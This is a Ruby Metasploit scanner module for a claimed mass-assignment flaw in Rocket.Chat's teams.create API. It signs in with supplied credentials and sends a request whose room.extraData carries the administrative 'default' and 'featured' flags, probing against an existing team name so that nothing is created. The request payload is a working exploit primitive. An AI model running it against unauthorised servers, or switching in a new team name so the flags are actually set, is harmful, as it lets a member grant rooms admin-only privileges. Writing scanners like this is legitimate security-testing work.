class MetasploitModule < Msf::Auxiliary
  LOGIN_PATH = '/api/v1/login'.freeze

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Rocket.Chat teams.create room.extraData mass-assignment scanner (VULN-058)',
        'Description' => %q{
          Rocket.Chat is a self-hosted team chat server. POST /api/v1/teams.create
          spreads the caller's room.extraData straight into the new room document, so
          a member who may create a team also sets administrative flags such as
          default (auto-join for every new user) and featured, which the sibling
          channels.create rejects. This scanner signs in with the operator's
          credentials and sends teams.create for an EXISTING team name with extraData:
          a host is vulnerable when it fails on the duplicate name
          (team-name-already-exists) rather than refusing the extraData, proving the
          field reached storage. It creates nothing.
        },
        'Author' => ['Blue Spider'],
        'License' => MSF_LICENSE,
        'References' => [
          ['URL', 'https://github.com/RocketChat/Rocket.Chat/issues'],
          ['URL', 'https://kohirc.com']
        ],
        'DisclosureDate' => '2026-11-24',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      Opt::RPORT(39649),
      OptString.new('TARGETURI', [true, 'Base path to Rocket.Chat', '/api/v1/teams.create']),
      OptString.new('USERNAME', [true, 'A valid account on the target', '']),
      OptString.new('PASSWORD', [true, 'That account\'s password', '']),
      OptString.new('EXISTINGTEAM', [true, 'An existing team name, for the non-mutating scanner probe', 'acme']),
      OptString.new('NEWTEAM', [true, 'The team name the exploit module creates with injected flags', 'bs-helpdesk-probe']),
      OptString.new('TOTPCODE', [false, 'The current second-factor code, when the account given has one enrolled', ''])
    ])
  end

  # Sign in with credentials the operator already has. A module never
  # creates an account, seeds data, or changes state to make itself work.
  # Rocket.Chat answers POST /api/v1/login with a token pair rather than a
  # cookie, so the pair is what every later request carries. TOTPCODE is for
  # an account with a second factor enrolled: the operator supplies the
  # current code with the password, as they would in any other client.
  def authenticate
    creds = { 'user' => datastore['USERNAME'], 'password' => datastore['PASSWORD'] }
    creds['code'] = datastore['TOTPCODE'] unless datastore['TOTPCODE'].to_s.empty?
    2.times do |attempt|
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => normalize_uri(LOGIN_PATH),
        'ctype' => 'application/json',
        'data' => creds.to_json
      })
      if res && res.code == 200
        doc = parse_json(res)
        @auth_token = doc.dig('data', 'authToken')
        @user_id = doc.dig('data', 'userId')
        unless @auth_token.nil? || @user_id.nil?
          vprint_status("#{peer} - Signed in as #{datastore['USERNAME']} (user id #{@user_id})")
          return true
        end
      end
      sleep(2) if attempt.zero?   # ride out a transient per-route rate limit
    end
    false
  end

  def run_host(ip)
    unless authenticate
      vprint_error("#{peer} - Could not sign in")
      return
    end

    res = create_team(datastore['EXISTINGTEAM'])
    unless res
      vprint_error("#{peer} - No response")
      return
    end

    hit = api_error(res).include?('team-name-already-exists')
    unless hit
      vprint_status("#{peer} - Not vulnerable to VULN-058")
      return
    end

    print_good("#{peer} - Vulnerable: VULN-058")
    report_vuln(
      host: ip,
      port: rport,
      proto: 'tcp',
      sname: (ssl ? 'https' : 'http'),
      name: name,
      info: 'VULN-058 confirmed by Blue Spider',
      refs: references
    )
  end
  # The REST API answers 200 with {"success": false} for a refusal, so the
  # body, not the status line, is what a check has to read.
  def parse_json(res)
    return {} unless res

    doc = res.get_json_document
    doc.is_a?(Hash) ? doc : {}
  rescue StandardError
    {}
  end

  def api_error(res)
    doc = parse_json(res)
    doc['errorType'] || doc['error'] || doc['message'] || ''
  end

  def create_team(name)
    extra = { 'default' => true, 'featured' => true }
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path),
      'ctype' => 'application/json',
      'headers' => { 'X-Auth-Token' => @auth_token, 'X-User-Id' => @user_id },
      'data' => { 'name' => name, 'type' => 1, 'room' => { 'extraData' => extra } }.to_json
    })
  end
end
